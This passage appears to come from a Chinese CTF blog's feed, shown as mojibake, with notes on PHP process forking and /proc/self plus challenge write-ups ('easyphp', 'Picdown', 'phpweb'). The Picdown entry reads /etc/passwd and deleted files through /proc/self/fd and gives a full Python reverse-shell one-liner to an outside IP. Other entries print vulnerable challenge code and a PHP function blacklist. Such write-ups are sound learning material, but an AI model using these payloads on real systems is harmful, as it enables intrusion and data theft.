¹æ®è¿›ç¨‹è¡¨ä¸­ä¿å­˜çš„æœ¬è¿›ç¨‹æ‰§è¡Œä¸Šä¸‹æ–‡ä¿¡æ¯ï¼Œæ›´æ–°è¿™ä¸ªå¯„å­˜å™¨ï¼‰ã€‚</p><blockquote><p>pid=pcntl_fork();</p></blockquote><p>æ“ä½œç³»ç»Ÿåˆ›å»ºä¸€ä¸ªæ–°çš„è¿›ç¨‹ï¼ˆå­è¿›ç¨‹ï¼‰ï¼Œå¹¶ä¸”åœ¨è¿›ç¨‹è¡¨ä¸­ç›¸åº”ä¸ºå®ƒå»ºç«‹ä¸€ä¸ªæ–°çš„è¡¨é¡¹ã€‚æ–°è¿›ç¨‹å’ŒåŸæœ‰è¿›ç¨‹çš„å¯æ‰§è¡Œç¨‹åºæ˜¯åŒä¸€ä¸ªç¨‹åºï¼›ä¸Šä¸‹æ–‡å’Œæ•°æ®ï¼Œç»å¤§éƒ¨åˆ†å°±æ˜¯åŸè¿›ç¨‹ï¼ˆçˆ¶è¿›ç¨‹ï¼‰çš„æ‹·è´ï¼Œä½†å®ƒä»¬æ˜¯ä¸¤ä¸ªç›¸äº’ç‹¬ç«‹çš„è¿›ç¨‹ï¼æ­¤æ—¶ç¨‹åºå¯„å­˜å™¨pcåœ¨çˆ¶ã€å­è¿›ç¨‹çš„ä¸Šä¸‹æ–‡ä¸­éƒ½å£°ç§°ï¼Œè¿™ä¸ªè¿›ç¨‹ç›®å‰æ‰§è¡Œåˆ°forkè°ƒç”¨å³å°†è¿”å›ï¼ˆæ­¤æ—¶å­è¿›ç¨‹ä¸å æœ‰CPUï¼Œå­è¿›ç¨‹çš„pcä¸æ˜¯çœŸæ­£ä¿å­˜åœ¨å¯„å­˜å™¨ä¸­ï¼Œè€Œæ˜¯ä½œä¸ºè¿›ç¨‹ä¸Šä¸‹æ–‡ä¿å­˜åœ¨è¿›ç¨‹è¡¨ä¸­çš„å¯¹åº”è¡¨é¡¹å†…ï¼‰ã€‚é—®é¢˜æ˜¯æ€ä¹ˆè¿”å›ï¼Œåœ¨çˆ¶å­è¿›ç¨‹ä¸­å°±åˆ†é“æ‰¬é•³ã€‚</p><p>çˆ¶è¿›ç¨‹ç»§ç»­æ‰§è¡Œæ“ä½œç³»ç»Ÿå¯¹forkçš„å®ç°ï¼Œä½¿è¿™ä¸ªè°ƒç”¨åœ¨çˆ¶è¿›ç¨‹ä¸­è¿”å›åˆšåˆšåˆ›å»ºçš„å­è¿›ç¨‹çš„pidï¼ˆä¸€ä¸ªæ­£æ•´æ•°ï¼‰ï¼Œæ‰€ä»¥åé¢çš„ifè¯­å¥ä¸­pid&lt;0, pid==0çš„ä¸¤ä¸ªåˆ†æ”¯éƒ½ä¸ä¼šæ‰§è¡Œã€‚æ‰€ä»¥è¾“å‡ºï¼ši am the parent processâ€¦</p><p>æ¥ç€å­è¿›ç¨‹åœ¨ä¹‹åçš„æŸä¸ªæ—¶å€™å¾—åˆ°è°ƒåº¦ï¼Œå®ƒçš„ä¸Šä¸‹æ–‡è¢«æ¢å…¥ï¼Œå æ® CPUï¼Œæ“ä½œç³»ç»Ÿå¯¹forkçš„å®ç°ä½¿å¾—å­è¿›ç¨‹ä¸­forkè°ƒç”¨è¿”å›0ï¼Œæ‰€ä»¥åœ¨è¿™ä¸ªè¿›ç¨‹ä¸­pid=0ï¼ˆæ³¨æ„è¿™ä¸æ˜¯çˆ¶è¿›ç¨‹äº†å“¦ï¼Œè™½ç„¶æ˜¯åŒä¸€ä¸ªç¨‹åºï¼Œä½†æ˜¯è¿™æ˜¯åŒä¸€ä¸ªç¨‹åºçš„å¦å¤–ä¸€æ¬¡æ‰§è¡Œï¼Œåœ¨æ“ä½œç³»ç»Ÿä¸­è¿™æ¬¡æ‰§è¡Œæ˜¯ç”±å¦å¤–ä¸€ä¸ªè¿›ç¨‹è¡¨ç¤ºçš„ï¼Œä»æ‰§è¡Œçš„è§’åº¦è¯´å’Œçˆ¶è¿›ç¨‹ç›¸äº’ç‹¬ç«‹ï¼‰ã€‚è¿™ä¸ªè¿›ç¨‹åœ¨ç»§ç»­æ‰§è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œifè¯­å¥ä¸­ pid&lt;0ä¸æ»¡è¶³ï¼Œä½†æ˜¯pid==0æ˜¯trueï¼Œæ‰€ä»¥è¾“å‡ºï¼ši am the child processâ€¦</p><p>ä¸ºä»€ä¹ˆçœ‹ä¸Šå»ç¨‹åºä¸­äº’æ–¥çš„ä¸¤ä¸ªåˆ†æ”¯éƒ½è¢«æ‰§è¡Œäº†ï¼Œåœ¨ä¸€ä¸ªç¨‹åºçš„ä¸€æ¬¡æ‰§è¡Œä¸­ï¼Œè¿™å½“ç„¶æ˜¯ä¸å¯èƒ½çš„ï¼Œäº‹å®ä¸Šä½ çœ‹åˆ°çš„ä¸¤è¡Œè¾“å‡ºæ˜¯æ¥è‡ªä¸¤ä¸ªç‹¬ç«‹çš„è¿›ç¨‹ï¼Œè€Œè¿™ä¸¤ä¸ªè¿›ç¨‹æ¥è‡ªåŒä¸€ä¸ªç¨‹åºçš„ä¸¤æ¬¡æ‰§è¡Œã€‚</p><p>forkä¹‹åï¼Œæ“ä½œç³»ç»Ÿä¼šå¤åˆ¶ä¸€ä¸ªä¸çˆ¶è¿›ç¨‹å®Œå…¨ç›¸åŒçš„å­è¿›ç¨‹ï¼Œè™½è¯´æ˜¯çˆ¶å­å…³ç³»ï¼Œä½†æ˜¯åœ¨æ“ä½œç³»ç»Ÿçœ‹æ¥ï¼Œä»–ä»¬æ›´åƒå…„å¼Ÿå…³ç³»ï¼Œè¿™2ä¸ªè¿›ç¨‹å…±äº«ä»£ç ç©ºé—´ï¼Œä½†æ˜¯æ•°æ®ç©ºé—´æ˜¯äº’ç›¸ç‹¬ç«‹çš„ï¼Œå­è¿›ç¨‹æ•°æ®ç©ºé—´ä¸­çš„å†…å®¹æ˜¯çˆ¶è¿›ç¨‹çš„å®Œæ•´æ‹·è´ï¼ŒæŒ‡ä»¤æŒ‡é’ˆä¹Ÿå®Œå…¨ç›¸åŒï¼Œä½†åªæœ‰ä¸€ç‚¹ä¸åŒï¼Œå¦‚æœforkæˆåŠŸï¼Œå­è¿›ç¨‹ä¸­forkçš„è¿”å›å€¼æ˜¯0ï¼Œçˆ¶è¿›ç¨‹ä¸­forkçš„è¿”å›å€¼æ˜¯å­è¿›ç¨‹çš„è¿›ç¨‹å·ï¼Œå¦‚æœforkå¤±è´¥ï¼Œçˆ¶è¿›ç¨‹ä¼šè¿”å›é”™è¯¯ã€‚</p><p>å¯ä»¥è¿™æ ·æƒ³è±¡ï¼Œ2ä¸ªè¿›ç¨‹ä¸€ç›´åŒæ—¶è¿è¡Œï¼Œè€Œä¸”æ­¥è°ƒä¸€è‡´ï¼Œåœ¨forkä¹‹åï¼Œä»–ä»¬åˆ†åˆ«ä½œä¸åŒçš„å·¥ä½œï¼Œä¹Ÿå°±æ˜¯åˆ†å²”äº†ï¼Œè¿™ä¹Ÿæ˜¯forkä¸ºä»€ä¹ˆå«forkçš„åŸå› ã€‚<br>è‡³äºå“ªä¸€ä¸ªè¿›ç¨‹æœ€å…ˆè¿è¡Œï¼Œè¿™ä¸æ“ä½œç³»ç»Ÿå¹³å°çš„è°ƒåº¦ç®—æ³•æœ‰å…³ï¼Œè€Œä¸”è¿™ä¸ªé—®é¢˜åœ¨å®é™…åº”ç”¨ä¸­å¹¶ä¸é‡è¦ï¼Œå¦‚æœéœ€è¦çˆ¶å­è¿›ç¨‹ååŒè¿ä½œï¼Œå¯ä»¥é€šè¿‡æ§åˆ¶è¯­æ³•ç»“æ„çš„åŠæ³•è§£å†³ã€‚</p><p>forkå‰å­è¿›ç¨‹å¯ä»¥ç»§æ‰¿çˆ¶è¿›ç¨‹çš„ä¸œè¥¿ï¼Œä½†æ˜¯åœ¨pcntl_fork()åå­è¿›ç¨‹å’Œçˆ¶è¿›ç¨‹å°±æ²¡æœ‰ä»»ä½•ç»§æ‰¿å…³ç³»äº†ã€‚åœ¨å­è¿›ç¨‹é‡Œåˆ›å»ºçš„ä¸œè¥¿æ˜¯å­è¿›ç¨‹çš„ï¼Œåœ¨çˆ¶è¿›ç¨‹åˆ›å»ºçš„ä¸œè¥¿æ˜¯çˆ¶è¿›ç¨‹çš„ï¼Œå¯ä»¥å®Œå…¨çœ‹æˆæ˜¯ä¸¤ä¸ªç‹¬ç«‹çš„è¿›ç¨‹ã€‚</p><p>åœ¨ç¨‹åºæ®µé‡Œç”¨äº†pcntl_fork()ä¹‹åç¨‹åºå‡ºäº†åˆ†å²”ï¼Œæ´¾ç”Ÿå‡ºäº†ä¸¤ä¸ªè¿›ç¨‹ï¼Œå…·ä½“å“ªä¸ªå…ˆè¿è¡Œå°±çœ‹è¯¥ç³»ç»Ÿçš„è°ƒåº¦ç®—æ³•äº†ã€‚<br>åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å¯ä»¥è¿™ä¹ˆè®¤ä¸ºï¼Œåœ¨è¿è¡Œåˆ°â€pid=pcntl_fork();â€æ—¶ç³»ç»Ÿæ´¾ç”Ÿå‡ºä¸€ä¸ªè·Ÿä¸»ç¨‹åºä¸€æ¨¡ä¸€æ ·çš„å­è¿›ç¨‹ã€‚è¯¥è¿›ç¨‹çš„â€pid=pcntl_fork();â€ä¸€å¥ä¸­ pidå¾—åˆ°çš„å°±æ˜¯å­è¿›ç¨‹æœ¬èº«çš„pidï¼›å­è¿›ç¨‹ç»“æŸåï¼Œçˆ¶è¿›ç¨‹çš„â€pid=pcntl_fork();â€ä¸­pidå¾—åˆ°çš„å°±æ˜¯çˆ¶è¿›ç¨‹æœ¬èº«çš„pidï¼Œå› æ­¤è¯¥ç¨‹åºæœ‰ä¸¤è¡Œè¾“å‡ºã€‚</p><p>pcntl_fork()å‡½æ•°å¤åˆ¶äº†å½“å‰è¿›ç¨‹çš„PCBï¼Œå¹¶å‘çˆ¶è¿›ç¨‹è¿”å›äº†æ´¾ç”Ÿå­è¿›ç¨‹çš„pidï¼Œçˆ¶å­è¿›ç¨‹å¹¶è¡Œï¼Œæ‰“å°è¯­å¥çš„å…ˆåå®Œå…¨çœ‹ç³»ç»Ÿçš„è°ƒåº¦ç®—æ³•ï¼Œæ‰“å°çš„å†…å®¹æ§åˆ¶åˆ™é pidå˜é‡æ¥æ§åˆ¶ã€‚å› ä¸ºæˆ‘ä»¬çŸ¥é“pcntl_fork()å‘çˆ¶è¿›ç¨‹è¿”å›äº†æ´¾ç”Ÿå­è¿›ç¨‹çš„pidï¼Œæ˜¯ä¸ªæ­£æ•´æ•°ï¼›è€Œæ´¾ç”Ÿå­è¿›ç¨‹çš„pidå˜é‡å¹¶æ²¡æœ‰è¢«æ”¹å˜ï¼Œè¿™ä¸€åŒºåˆ«ä½¿å¾—æˆ‘ä»¬çœ‹åˆ°äº†ä»–ä»¬çš„ä¸åŒè¾“å‡ºã€‚</p><ol><li>æ´¾ç”Ÿå­è¿›ç¨‹çš„è¿›ç¨‹ï¼Œå³çˆ¶è¿›ç¨‹ï¼Œå…¶pidä¸å˜ï¼›</li><li>å¯¹å­è¿›ç¨‹æ¥è¯´ï¼Œfork()å‡½æ•°è¿”å›ç»™å®ƒ0, ä½†å®ƒè‡ªèº«çš„pidç»å¯¹ä¸ä¼šæ˜¯0ï¼›ä¹‹æ‰€ä»¥fork()å‡½æ•°è¿”å›0ç»™å®ƒï¼Œæ˜¯å› ä¸ºå®ƒéšæ—¶å¯ä»¥è°ƒç”¨getpid()æ¥è·å–è‡ªå·±çš„pidï¼›</li><li>forkä¹‹åçˆ¶ã€å­è¿›ç¨‹é™¤éé‡‡ç”¨äº†åŒæ­¥æ‰‹æ®µï¼Œå¦åˆ™ä¸èƒ½ç¡®å®šè°å…ˆè¿è¡Œï¼Œä¹Ÿä¸èƒ½ç¡®å®šè°å…ˆç»“æŸã€‚è®¤ä¸ºå­è¿›ç¨‹ç»“æŸåçˆ¶è¿›ç¨‹æ‰ä»forkè¿”å›çš„ï¼Œè¿™æ˜¯ä¸å¯¹çš„ï¼Œforkä¸æ˜¯è¿™æ ·çš„ï¼Œvforkæ‰è¿™æ ·ã€‚</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>åä¸‰å±Šeasyphp</title>
      <link href="/2021/05/04/%E5%8D%81%E4%B8%89%E5%B1%8Aeasyphp/"/>
      <url>/2021/05/04/%E5%8D%81%E4%B8%89%E5%B1%8Aeasyphp/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><pre><code>&lt;?php$pid=pcntl_fork();if($pid==-1)    die(&#39;could not fork&#39;);else if($pid==1)&#123;    $r=pcntl_wait($status);    if(!pcntl_wifexited($status))&#123;        phpinfo();    &#125;&#125;else&#123;    highlight_file(__FILE__);    if(isset($_GET[&#39;a&#39;])&amp;&amp;is_string($_GET[&#39;a&#39;])&amp;&amp;!preg_match(&quot;/[:\\\\]|exec|pcntl/i&quot;,$_GET[&#39;a&#39;]))&#123;        call_user_func_array($_GET[&#39;a&#39;],[$_GET[&#39;b&#39;],false,true]);    &#125;    posix_kill(posix_getpid(),SIGUSR1);&#125;?&gt; </code></pre><p>é¢˜ç›®æºç </p><p>å¦‚æœçˆ¶è¿›ç¨‹å…ˆé€€å‡ºï¼Œé€ æˆäº†å­è¿›ç¨‹è¢«initæ¥ç®¡ï¼Œæ‰€ä»¥å­è¿›ç¨‹ä¸ºä¸€ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦åšçš„å°±æ˜¯æ€ä¹ˆè®©çˆ¶è¿›ç¨‹é€€å‡º</p><blockquote><p>pcntl_wait ç­‰å¾…æˆ–è¿”å›å­è¿›ç¨‹çš„çŠ¶æ€<br>pcntl_wifexited  è·å–çŠ¶æ€å€¼</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>0ctf-piapiapia</title>
      <link href="/2021/05/04/0ctf-piapiapia/"/>
      <url>/2021/05/04/0ctf-piapiapia/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€<br>åˆæ˜¯ä¸€é“ä»£ç å®¡è®¡çš„é¢˜ç›®ã€‚ã€‚ã€‚ã€‚</p><span id="more"></span><p>#å‰ç½®çŸ¥è¯†</p><blockquote><p>1.extentsç»§æ‰¿ç±»ï¼Œ<a href="https://www.php.cn/php-weizijiaocheng-371591.html">è¯¦ç»†å‚è€ƒ</a></p></blockquote><blockquote><p>å¯¹äºè¿™é“é¢˜,æˆ‘ä»¬å¯ä»¥çŸ¥é“userè¿™ä¸ªç±»ç»§æ‰¿äº†mysqlè¿™ä¸ªç±»çš„æ–¹æ³•å’Œå±æ€§ï¼Œç„¶åé€šè¿‡parentæ¥è°ƒç”¨mysqlè¿™ä¸ªç±»ä¸­çš„æ–¹æ³•</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Linuxçš„/proc/selfå­¦ä¹ </title>
      <link href="/2021/04/24/Linux%E7%9A%84-proc-self%E5%AD%A6%E4%B9%A0/"/>
      <url>/2021/04/24/Linux%E7%9A%84-proc-self%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡/proc/$picæ¥è·å¾—æŒ‡å®šè¿›ç¨‹çš„ä¿¡æ¯ï¼Œä¾‹å¦‚å†…å­˜æ˜ å°„ï¼ŒCPUç»‘å®šä¿¡æ¯ç­‰ç­‰ã€‚å¦‚æœæŸä¸ªè¿›ç¨‹æƒ³è¦è·å¾—æœ¬è¿›ç¨‹çš„ç³»ç»Ÿä¿¡æ¯ï¼Œå°±å¯ä»¥é€šè¿‡è¿›ç¨‹çš„pidæ¥è®¿é—®/pic/$pidç›®å½•ã€‚ä½†æ˜¯è¿™ä¸­æ–¹æ³•è¿˜è¦è·å¾—pidï¼Œä¸ºäº†æ–¹ä¾¿è·å¾—ï¼Œlinuxæä¾›äº†/proc/selfç›®å½•ï¼Œè¿™ä¸ªç›®å½•æ¯”è¾ƒç‹¬ç‰¹ï¼Œä¸åŒè¿›ç¨‹è®¿é—®è¯¥ç›®å½•è·å¾—çš„è¿›ç¨‹æ˜¯ä¸åŒçš„ï¼Œè¿›ç¨‹å¯ä»¥é€šè¿‡è®¿é—®/proc/selfç›®å½•æ¥è·å–è‡ªå·±çš„ç³»ç»Ÿä¿¡æ¯ï¼Œè€Œä¸ç”¨æ¯æ¬¡éƒ½è·å–pic</p><h2>/procç›®å½•</h2><p>linuxå†…æ ¸æä¾›äº†ä¸€ç§é€šè¿‡/procæ–‡ä»¶ç³»ç»Ÿï¼Œé€šè¿‡æ”¹å˜å†…æ ¸iå•Šå†…éƒ¨æ•°æ®ç»“æ„ï¼Œæ”¹å˜å†…æ ¸è®¾ç½®çš„æœºåˆ¶ã€‚procæ–‡ä»¶ç³»ç»Ÿæ˜¯ä¸€ä¸ªä¼ªæ–‡ä»¶ç³»ç»Ÿï¼Œä»–åªå­˜åœ¨åœ¨å†…å­˜ï¼Œè€Œä¸å ç”¨å¤–å­˜ç©ºé—´ã€‚å®ƒä»¥ç³»ç»Ÿæ–‡ä»¶çš„æ–¹å¼ä¸ºè®¿é—®ç³»ç»Ÿå†…æ ¸æ•°æ®çš„æ“ä½œæä¾›æ¥å£</p><p>è¿˜æœ‰ä¸€äº›æ˜¯ä»¥æ•°å­—å‘½åçš„ç›®å½•ï¼Œä»–ä»¬æ˜¯è¿›ç¨‹ç›®å½•ã€‚ç³»ç»Ÿä¸­æ¯ä¸€ä¸ªè¿›ç¨‹éƒ½æœ‰ä¸€ä¸ªå¯¹åº”çš„ç›®å½•åœ¨/procä¸‹ï¼Œä»¥è¿›ç¨‹çš„PIDå·ä¸ºç›®å½•åï¼Œå®ƒä»¬æ˜¯å¯¹å»è¿›ç¨‹ä¿¡æ¯çš„æ¥å£ã€‚è€Œselfç›®å½•æ˜¯è¯»å–è¿›ç¨‹æœ¬èº«çš„ä¿¡æ¯æ¥å£</p><p>è“è‰²çš„å°±æ˜¯è¿›ç¨‹å·PIC</p><p><img src="2.PNG"></p><p><a href="https://blog.csdn.net/qq_31939617/article/details/80478663">ls -alçš„å„é¡¹è¯´æ˜</a></p><h2>cmdline</h2><p>è¯¥æ–‡ä»¶å­˜å‚¨ç€å¯åŠ¨å½“å‰è¿›ç¨‹çš„å®Œæ•´å‘½ä»¤</p><p><img src="3.PNG"></p><h2>cwd</h2><p>cwdæ–‡ä»¶æ˜¯ä¸€ä¸ªæŒ‡å‘å½“å‰è¿›ç¨‹è¿è¡Œç›®å½•çš„ç¬¦å·é“¾æ¥</p><h2>exe</h2><p>æ˜¯ä¸€ä¸ªæŒ‡å‘å¯åŠ¨å½“å‰è¿›ç¨‹çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆå®Œæ•´è·¯å¾„ï¼‰çš„ç¬¦å·è¿æ¥ã€‚é€šè¿‡exeæ–‡ä»¶æˆ‘ä»¬å¯ä»¥è·å¾—æŒ‡å®šè¿›ç¨‹çš„å¯æ‰§è¡Œæ–‡ä»¶çš„å®Œæ•´è·¯å¾„</p><h2>environ</h2>environæ–‡ä»¶å­˜å‚¨ç€å½“å‰è¿›ç¨‹çš„ç¯å¢ƒå˜é‡åˆ—è¡¨ï¼Œå½¼æ­¤é—´ç”¨ç©ºå­—ç¬¦ï¼ˆNULLï¼‰éš”å¼€ï¼Œå˜é‡ç”¨å¤§å†™å­—æ¯è¡¨ç¤ºï¼Œå…¶å€¼ç”¨å°å†™å­—æ¯è¡¨ç¤ºã€‚å¯ä»¥é€šè¿‡æŸ¥çœ‹environç›®å½•æ¥è·å–æŒ‡å®šè¿›ç¨‹çš„ç¯å¢ƒå˜é‡ä¿¡æ¯<h2>fd ï¼Œæ¯”è¾ƒé‡è¦</h2>fdæ˜¯ä¸€ä¸ªç›®å½•ï¼Œé‡Œé¢åŒ…å«ç€å½“å‰è¿›ç¨‹æ‰“å¼€çš„æ¯ä¸€ä¸ªæ–‡ä»¶çš„æè¿°ç¬¦ï¼ˆfile descriptorï¼‰å·®ä¸å¤šå°±æ˜¯è·¯å¾„å•¦ï¼Œè¿™äº›æ–‡ä»¶æè¿°ç¬¦æ˜¯æŒ‡å‘å®é™…æ–‡ä»¶çš„ä¸€ä¸ªç¬¦å·è¿æ¥ï¼Œå³æ¯ä¸ªé€šè¿‡è¿™ä¸ªè¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶éƒ½ä¼šæ˜¾ç¤ºåœ¨è¿™é‡Œã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡fdç›®å½•çš„æ–‡ä»¶è·å–è¿›ç¨‹ï¼Œä»è€Œæ‰“å¼€æ¯ä¸ªæ–‡ä»¶çš„è·¯å¾„ä»¥åŠæ–‡ä»¶å†…å®¹ã€‚<p><code>è¿™ä¸ªfdæ¯”è¾ƒé‡è¦ï¼Œå› ä¸ºåœ¨Linuxç³»ç»Ÿä¸­ï¼Œå¦‚æœä¸€ä¸ªç¨‹åºç”¨ open() æ‰“å¼€äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œä½†æ˜¯æœ€ç»ˆæ²¡æœ‰å…³é—­å®ƒï¼Œå³ä½¿ä»å¤–éƒ¨ï¼ˆå¦‚ï¼šos.remove(SECRET_FILE))åˆ é™¤è¿™ä¸ªæ–‡ä»¶ä¹‹åï¼Œåœ¨/procè¿™ä¸ªè¿›ç¨‹çš„ pidç›®å½•ä¸‹çš„fdæ–‡ä»¶æè¿°ç¬¦ ç›®å½•ä¸‹ è¿˜æ˜¯ä¼šæœ‰è¿™ä¸ªæ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œé€šè¿‡è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦æˆ‘ä»¬å³å¯ä»¥å¾—åˆ°è¢«åˆ é™¤çš„æ–‡ä»¶çš„å†…å®¹</code></p><h2>self</h2><p>ä¸Šé¢çš„è¿™äº›æ“ä½œåˆ—å‡ºçš„éƒ½æ˜¯ç›®æ ‡ç¯å¢ƒæŒ‡å®šè¿›ç¨‹çš„ä¿¡æ¯ï¼Œä½†æ˜¯æˆ‘ä»¬åœ¨åšé¢˜çš„æ—¶å€™å¾€å¾€éœ€è¦çš„å½“å‰è¿›ç¨‹çš„ä¿¡æ¯ï¼Œè¿™æ—¶å€™å°±ç”¨åˆ°äº†/proc ç›®å½•ä¸­çš„selfå­ç›®å½•äº†ã€‚</p><p>/proc/selfè¡¨ç¤ºå½“å‰è¿›ç¨‹ç›®å½•ã€‚å‰é¢è¯´äº†é€šè¿‡/proc/$pid/æ¥è·å–æŒ‡å®šè¿›ç¨‹çš„ä¿¡æ¯ã€‚å¦‚æœæŸä¸ªè¿›ç¨‹æƒ³è¦è·å–å½“å‰è¿›ç¨‹çš„ç³»ç»Ÿä¿¡æ¯ï¼Œå°±å¯ä»¥é€šè¿‡è¿›ç¨‹çš„pidæ¥è®¿é—®/proc/$pid/ç›®å½•ã€‚ä½†æ˜¯è¿™ä¸ªæ–¹æ³•è¿˜éœ€è¦è·å–è¿›ç¨‹pidã€‚</p><p>åœ¨forkã€daemonç­‰æƒ…å†µä¸‹pidè¿˜å¯èƒ½å‘ç”Ÿå˜åŒ–ã€‚</p><p>ä¸ºäº†æ›´æ–¹ä¾¿çš„è·å–æœ¬è¿›ç¨‹çš„ä¿¡æ¯ï¼ŒLinuxæä¾›äº†/proc/self/ç›®å½•ï¼Œè¿™ä¸ªç›®å½•æ¯”è¾ƒç‹¬ç‰¹ï¼Œä¸åŒçš„è¿›ç¨‹è®¿é—®è¯¥ç›®å½•æ—¶è·å¾—çš„ä¿¡æ¯æ—¶ä¸åŒçš„ï¼Œå†…å®¹ç­‰ä»·äº/proc/æœ¬è¿›ç¨‹pid/ã€‚è¿›ç¨‹å¯ä»¥é€šè¿‡è®¿é—®/proc/self/ç›®å½•æ¥è·å–è‡ªå·±çš„ç³»ç»Ÿä¿¡æ¯ï¼Œè€Œä¸ç”¨æ¯æ¬¡éƒ½è·å–pidã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Picdown</title>
      <link href="/2021/04/24/Picdown/"/>
      <url>/2021/04/24/Picdown/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h2>éé¢„æœŸè§£</h2><p>æ‰“å¼€é¢˜ç›®æ˜¯ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œéšä¾¿è¾“ï¼Œå‘ç°urlå˜äº†</p><p><a href="http://7ca0ad1e-09a8-4c80-b6ad-5f9afa360fb7.node3.buuoj.cn/page%60%60%60?url=1%60%60%60">http://7ca0ad1e-09a8-4c80-b6ad-5f9afa360fb7.node3.buuoj.cn/page```?url=1```</a></p><p>ç„¶åå°è¯•æ”¹å˜urlï¼Œå°è¯•è¯»å–/etc/passwd,æ˜¯å¯ä»¥æˆåŠŸè¯»å–å¾—ï¼Œç„¶åæˆ‘ä»¬å°±å°è¯•è¯»å–flag</p><blockquote><p>url=/flag,å°±å¯ä»¥è¯»å–flag</p></blockquote><h2>é¢„æœŸè§£</h2><p>ä¸€ç›´æ²¡æœ‰æˆåŠŸä¹Ÿæ˜¯æ— è¯­äº†</p><p>æˆ‘ä»¬é€šè¿‡æŸ¥çœ‹proc/self/cmdlineå»æŸ¥çœ‹ä»–çš„è¿›ç¨‹ï¼Œå»è¯»å–app.py</p><p>![](1.    PNG)</p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä»–å…¶å®æ˜¯å§é‚£ä¸ªæ–‡ä»¶ç»™åˆ é™¤äº†ï¼Œä½†æ˜¯æˆ‘ä»¬çŸ¥é“å¦‚æœä¸€ä¸ªæ–‡ä»¶åœ¨æ‰“å¼€çš„æƒ…å†µä¸‹è¢«åˆ é™¤æ˜¯å¯ä»¥åœ¨proc/self/fd/ä¸­æ‰¾å›çš„</p><p>äºæ˜¯è¿›è¡Œçˆ†ç ´ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯/proc/self/fd/3ï¼Œä½†æ˜¯å°±åœ¨è¿™é‡Œæˆ‘å¾—åˆ°çš„keyä¸€ç›´æç¤ºè¯´æ˜¯é”™è¯¯çš„ï¼Œä¹Ÿæ˜¯æ²¡è°äº†</p><p>ç„¶ååå¼¹shell</p><blockquote><p>shell=python -c â€˜import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((â€œ47.xx.xx.xxxâ€,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([â€œ/bin/bashâ€,â€-iâ€]);â€™</p></blockquote><p>172.16.158.38</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>æœ±é›€æ¯phpweb</title>
      <link href="/2021/04/24/%E6%9C%B1%E9%9B%80%E6%9D%AFphpweb/"/>
      <url>/2021/04/24/%E6%9C%B1%E9%9B%80%E6%9D%AFphpweb/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>å¼€ç¯‡</p><p><img src="1.PNG"></p><p>ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œå¹¶ä¸”æ¯5åˆ†é’Ÿåˆ·æ–°ç•Œé¢ï¼Œæœæ–­bpæŠ“åŒ…ï¼Œå‘ç°æœ‰ä¸¤ä¸ªå‚æ•°</p><blockquote><p>func p</p></blockquote><p>å¦‚æœæ”¹å˜funcå¾—å€¼ï¼Œç¬¬ä¸€æ¬¡æˆ‘æ¢æˆäº†systemæ˜¾ç¤ºå¾—æ˜¯hackerâ€¦ï¼Œéšä¾¿å†™äº†ä¸€ä¸ªå‘ç°æœ‰æŠ¥é”™</p><p><img src="2.PNG">,æç¤ºäº†ä¸€ä¸ªé‡è¦å¾—å‡½æ•°</p><p><img src="3.PNG"></p><p>å°è¯•äº†å¾ˆå¤šå‡½æ•°å‘ç°éƒ½è¢«è¿‡æ»¤äº†ï¼Œè¿™é‡Œç”¨åˆ°äº†file_get_contentæˆ–è€…readfile,è¯»å–index.php</p><pre><code>    &lt;?php$disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);function gettime($func, $p) &#123;    $result = call_user_func($func, $p);    $a= gettype($result);    if ($a == &quot;string&quot;) &#123;        return $result;    &#125; else &#123;return &quot;&quot;;&#125;&#125;class Test &#123;    var $p = &quot;Y-m-d h:i:s a&quot;;    var $func = &quot;date&quot;;    function __destruct() &#123;        if ($this-&gt;func != &quot;&quot;) &#123;            echo gettime($this-&gt;func, $this-&gt;p);        &#125;    &#125;&#125;$func = $_REQUEST[&quot;func&quot;];$p = $_REQUEST[&quot;p&quot;];if ($func != null) &#123;    $func = strtolower($func);    if (!in_array($func,$disable_fun)) &#123;        echo gettime($func, $p);    &#125;else &#123;        die(&quot;Hacker...&quot;);    